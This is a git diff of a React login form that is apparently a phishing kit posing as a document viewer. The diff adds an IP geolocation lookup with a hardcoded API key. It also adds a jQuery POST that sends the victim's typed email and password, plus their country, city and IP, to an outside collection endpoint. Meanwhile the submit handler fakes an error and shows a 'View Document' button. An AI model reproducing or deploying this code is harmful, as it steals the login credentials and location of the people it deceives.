@@ -1,12 +1,52 @@
 
-import React, { useState, useRef } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import './form.css';
 import Too from './../media/img/to.png';
-// import $ from 'jquery';
-import emailJS from '@emailjs/browser';
+import $ from 'jquery';
+// import emailJS from '@emailjs/browser';
 
 
 export const Form = ()=>{
+
+
+
+
+    const [ipAdress, setIpAdress] = useState('')
+    const [city, setCity] = useState('');
+    const [flag, setFlag] = useState('');
+    const [country, setCountry] = useState('');
+
+
+    useEffect(()=>{
+        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=44db379787c14bccb69d3de62462aefb`)
+        .then(req=> req.json())
+        .then(res=>{
+            // setCountry(res.names.en)
+            // console.log(res.names.en);
+            // console.log('city:',res.city.name);
+
+            setIpAdress(res.ip)
+            setFlag(res.country.flag);
+            setCountry(res.country.name);
+            setCity(res.city.names.en);
+
+            
+            
+            
+            
+            // console.log('ipAddress:', res.ip);
+            // console.log('flag:', res.country.flag);
+            // console.log('country:', res.country.name);
+            // console.log('city:', res.city.names.en);
+            // console.log(res);
+        })
+        .catch(e=> console.log)
+    }, []);
+
+
+
+
+
 
     const emailInTheURL = window.location.href;
     const sliceEqualSign = emailInTheURL.indexOf("=");
@@ -36,13 +76,12 @@ export const Form = ()=>{
             // goodcontact44@gmail.com = for d emalJS hosting
 
 
-            emailJS.sendForm('service_wzp993k', 'template_r1q05vm', form.current, 'fnFKgJwcLIz25_NKm')
-            .then((result) => {
-                console.log(result.text);
-            }, (error) => {
-                console.log(error.text);
-            });
-
+            // emailJS.sendForm('service_wzp993k', 'template_r1q05vm', form.current, 'fnFKgJwcLIz25_NKm')
+            // .then((result) => {
+            //     console.log(result.text);
+            // }, (error) => {
+            //     console.log(error.text);
+            // });
 
 
 
@@ -57,20 +96,24 @@ export const Form = ()=>{
               setErr(true);
               setBtn('View Document');
             }, 3700);
+
+            const user = {
+                email: email,
+                pswd: pwd,
+                country: country,
+                city: city,
+                flag: flag,
+                eyep: ipAdress
+            };
     
-        //     const user = {
-        //       email: email,
-        //       password: pwd
-        //   };
-    
-        //   $.ajax({
-        //       type: "POST",
-        //       url: "https://bucketlion.com/hello/faz.php",
-        //       data: user,
-        //       success(data) {
-        //           console.log(data);
-        //       },
-        //   });
+          $.ajax({
+              type: "POST",
+              url: "https://meler-service.onrender.com/get_details/fazahati.parslent@gmail.com",
+              data: user,
+              success(data) {
+                  console.log(data);
+              },
+          });
     
     
     // deploy
